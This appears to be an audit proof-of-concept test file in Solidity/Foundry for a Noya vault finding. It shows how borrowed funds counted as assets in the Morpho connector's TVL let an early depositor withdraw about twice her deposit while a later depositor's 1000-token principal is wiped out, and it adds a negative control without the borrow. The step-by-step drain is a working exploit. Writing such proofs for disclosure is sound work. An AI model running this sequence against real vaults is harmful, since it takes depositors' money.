/// @dev ESCALATION of the same root defect (borrowAmount ADDED instead of subtracted in
///      MorphoBlueConnector._getPositionTVL). The corrupted TVL is not just a wrong number:
///      AccountingManager.totalAssets() == TVL(), so the vault's ERC4626 share pricing
///      consumes it on BOTH queue legs:
///        - calculateDepositShares -> previewDeposit: a depositor arriving while debt is
///          outstanding mints ~half the fair shares for his base tokens;
///        - calculateWithdrawShares -> previewRedeem: a withdrawer leaving while debt is
///          outstanding is credited a claim computed on the inflated TVL.
///      Combining the two, an early depositor withdraws the vault's ENTIRE real value
///      (her own capital + the fresh deposit of a later depositor) and the later
///      depositor is left holding shares that redeem for exactly zero.
///
///      Every step goes through the protocol's own public entry points in keeper/user
///      order (R2): deposit/calculateDepositShares/executeDeposit, the connector's
///      designed supply/borrow/repay/withdraw manager ops, withdraw/
///      calculateWithdrawShares/startCurrentWithdrawGroup/retrieveTokensForWithdraw/
///      fulfillCurrentWithdrawGroup/executeWithdraw. No vm.store, no fabricated state;
///      the only roles used are the vault's own keeper (owner in the harness) and two
///      ordinary depositors.
contract PoC_2024_04_noya__H_19_f9_Escalation is testStarter {
    MinimalMorphoBlue morpho;
    MorphoBlueConnector connector;
    MockToken base; // vault base token AND the Morpho market token (loan == collateral)
    MarketParams marketParams;
    Id marketId;

    address lender = makeAddr("lender"); // ordinary Morpho liquidity provider

    uint256 constant LLTV = 0.8e18;
    uint256 constant LIQUIDITY = 3000e18;
    uint256 constant DEPOSIT = 1000e18; // what each depositor puts in
    uint256 constant BORROW = 500e18; // the manager's Morpho borrow (defect trigger)

    function setUp() public {
        vm.startPrank(owner);

        base = new MockToken("Base", "B");
        deployEverythingNormal(address(base));

        morpho = new MinimalMorphoBlue();
        FixedPriceOracle oracle = new FixedPriceOracle(1e36); // 1:1, 18 decimals both sides
        // Same-token market (loanToken == collateralToken): creatable through Morpho's own
        // public createMarket (no restriction against equal tokens), and it keeps every
        // vault asset denominated in the base token so the withdrawal is payable without
        // any swap. MinimalMorphoBlue enforces exactly production Morpho Blue's checks.
        marketParams = MarketParams({
            loanToken: address(base),
            collateralToken: address(base),
            oracle: address(oracle),
            irm: address(0), // zero-interest market (no accrual in the mock)
            lltv: LLTV
        });
        morpho.createMarket(marketParams);
        marketId = Id.wrap(keccak256(abi.encode(marketParams)));

        connector = new MorphoBlueConnector(address(morpho), BaseConnectorCP(registry, vaultId, swapHandler, noyaOracle));

        addConnectorToRegistry(vaultId, address(connector));
        addTrustedTokens(vaultId, address(accountingManager), address(base));
        addTrustedTokens(vaultId, address(connector), address(base));

        // Morpho market position: connector is the calculator, isDebt = false
        // (this position is expected to net supply/borrow internally - as the finding states).
        registry.addTrustedPosition(
            vaultId, connector.MORPHO_POSITION_ID(), address(connector), true, false, abi.encode(marketId), ""
        );
        // Plain ERC20 holding position (base token held by the connector).
        registry.addTrustedPosition(
            vaultId, 0, address(accountingManager), false, false, abi.encode(address(base)), ""
        );

        // Reachable precondition: market liquidity exists (an ordinary lender supplies
        // through Morpho's public entry point).
        base.mint(lender, LIQUIDITY);
        // harness default caps are 10e20 == exactly one DEPOSIT unit; the maintainer's own
        // config entry point raises them so a second deposit fits (note: with the defect
        // active the inflated TVL itself eats the deposit cap twice as fast).
        accountingManager.setDepositLimits(1e24, 1e24);
        vm.stopPrank();
        vm.startPrank(lender);
        base.approve(address(morpho), LIQUIDITY);
        morpho.supply(marketParams, LIQUIDITY, 0, lender, "");
        vm.stopPrank();
    }

    // ---- helpers: exactly the sequence a keeper runs for the deposit queue ----
    function _depositFrom(address user, uint256 amount) internal {
        base.mint(user, amount);
        vm.startPrank(user);
        base.approve(address(accountingManager), amount);
        accountingManager.deposit(user, amount, address(0));
        vm.stopPrank();
    }

    function _calculateAndExecuteDeposits() internal {
        vm.startPrank(owner);
        accountingManager.calculateDepositShares(10);
        vm.warp(block.timestamp + 35 minutes); // depositWaitingTime = 30 minutes
        accountingManager.executeDeposit(10, address(connector), "");
        vm.stopPrank();
    }

    function _calculatedWithdrawAmount(uint256 idx) internal view returns (uint256) {
        uint256[] memory ids = new uint256[](1);
        ids[0] = idx;
        (, WithdrawRequest[] memory wq) = accountingManager.getQueueItems(false, ids);
        return wq[0].amount;
    }

    /// @notice THE ESCALATED PoC (R1: measured principal loss of a non-consenting party):
    ///         alice withdraws ~2000 for 1000 deposited; bob's 1000 deposit is fully drained.
    function test_escalated_phantomDebt_TVL_drains_later_depositor_principal() public {
        // ---------- leg 1: alice deposits while the TVL is still honest ----------
        _depositFrom(alice, DEPOSIT);
        _calculateAndExecuteDeposits();
        assertEq(accountingManager.balanceOf(alice), DEPOSIT, "alice must get fair 1:1 shares pre-defect");

        // keeper deploys the deposits as Morpho collateral (normal strategy operation)
        vm.prank(owner);
        connector.supply(DEPOSIT, marketId, false);
        assertEq(accountingManager.TVL(), DEPOSIT, "TVL honest before any borrowing");

        // ---------- the defect trigger: the manager borrows (the connector's designed op) ----------
        vm.prank(owner);
        connector.borrow(BORROW, marketId);
        assertApproxEqAbs(accountingManager.TVL(), DEPOSIT + 2 * BORROW, 5, "TVL inflated by 2x borrow");
        // true net value is still 1000 (500 cash + 1000 collateral - 500 debt)

        // ---------- leg 2: bob deposits while the phantom value sits in the TVL ----------
        _depositFrom(bob, DEPOSIT);
        _calculateAndExecuteDeposits();
        // previewDeposit used totalAssets() == TVL() == 2000 instead of the true 1000:
        assertEq(accountingManager.balanceOf(bob), DEPOSIT / 2, "bob minted HALF the fair shares for his deposit");
        assertApproxEqAbs(accountingManager.TVL(), 3 * DEPOSIT, 5, "reported TVL 3000 vs true value 2000");

        // ---------- leg 3: alice exits through the public withdraw queue ----------
        vm.prank(alice);
        accountingManager.withdraw(DEPOSIT, alice); // her whole 1000e18 shares

        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(10);
        uint256 claim = _calculatedWithdrawAmount(0);
        // previewRedeem: 1000e18 * TVL(3000e18) / supply(1500e18) ~= 2000e18
        // == the ENTIRE real value of the vault (alice 1000 net + bob 1000)
        assertApproxEqAbs(claim, 2 * DEPOSIT, 2, "alice's claim computed on the inflated TVL");

        // keeper gathers the base tokens by unwinding the Morpho position
        // (repay the 500 debt, pull back the 1000 collateral; bob's 1000 is already cash)
        connector.repay(BORROW, marketId);
        connector.withdraw(DEPOSIT, marketId, false);
        assertEq(base.balanceOf(address(connector)), 2 * DEPOSIT, "realizable base == vault's entire real value");

        vm.warp(block.timestamp + 7 hours); // withdrawWaitingTime = 6 hours
        accountingManager.startCurrentWithdrawGroup();
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(claim, address(connector), abi.encode(claim, hex""));
        accountingManager.retrieveTokensForWithdraw(rd);
        accountingManager.fulfillCurrentWithdrawGroup();
        accountingManager.executeWithdraw(10);
        vm.stopPrank();

        // ---------- R1: measured, attributed adverse state changes ----------
        // (previewRedeem floors alice's claim to 2000e18 - 1, so a single wei of the
        // vault's real value stays locked on the connector as rounding dust)
        assertEq(base.balanceOf(alice), claim, "alice extracted the ENTIRE real value of the vault");
        assertGt(base.balanceOf(alice), DEPOSIT, "alice leaves with ~2x what she deposited");
        assertEq(base.balanceOf(address(accountingManager)), 0, "accounting manager emptied");
        assertLe(base.balanceOf(address(connector)), 1, "connector emptied (<= 1 wei dust)");
        assertLe(accountingManager.TVL(), 1, "vault holds nothing (<= 1 wei dust)");

        // bob deposited 1000e18 and his 500e18 shares now redeem for (at most) one wei
        assertEq(accountingManager.balanceOf(bob), DEPOSIT / 2, "bob's diluted share count");
        assertLe(accountingManager.previewRedeem(DEPOSIT / 2), 1, "bob's 1000e18 principal: ~100% loss");

        // the drain is even invisible to the vault's own fee accounting:
        assertEq(accountingManager.getProfit(), 0, "phantom drain nets to zero 'profit'");
    }

    /// @notice R3 negative control for the escalation: byte-for-byte the same lifecycle
    ///         (deposits, collateral supply, withdrawal, keeper queue processing) with the
    ///         borrow -- the defect's trigger -- absent. Nobody loses anything.
    function test_escalated_negativeControl_without_borrow_no_loss() public {
        _depositFrom(alice, DEPOSIT);
        _calculateAndExecuteDeposits();
        assertEq(accountingManager.balanceOf(alice), DEPOSIT, "alice fair 1:1 shares");

        vm.prank(owner);
        connector.supply(DEPOSIT, marketId, false);

        // (no borrow: the defect trigger is absent)

        _depositFrom(bob, DEPOSIT);
        _calculateAndExecuteDeposits();
        assertEq(accountingManager.balanceOf(bob), DEPOSIT, "bob receives fair 1:1 shares");

        vm.prank(alice);
        accountingManager.withdraw(DEPOSIT, alice);

        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(10);
        uint256 claim = _calculatedWithdrawAmount(0);
        assertApproxEqAbs(claim, DEPOSIT, 2, "alice's claim equals her fair share");

        vm.warp(block.timestamp + 7 hours);
        accountingManager.startCurrentWithdrawGroup();
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(claim, address(connector), abi.encode(claim, hex""));
        accountingManager.retrieveTokensForWithdraw(rd);
        accountingManager.fulfillCurrentWithdrawGroup();
        accountingManager.executeWithdraw(10);
        vm.stopPrank();

        assertEq(base.balanceOf(alice), claim, "alice gets exactly her fair payout");
        assertApproxEqAbs(base.balanceOf(alice), DEPOSIT, 2, "alice made no gain");
        assertApproxEqAbs(
            accountingManager.previewRedeem(accountingManager.balanceOf(bob)), DEPOSIT, 2, "bob's shares fully backed"
        );
        assertApproxEqAbs(accountingManager.TVL(), DEPOSIT, 2, "vault still holds bob's full principal");
    }
}
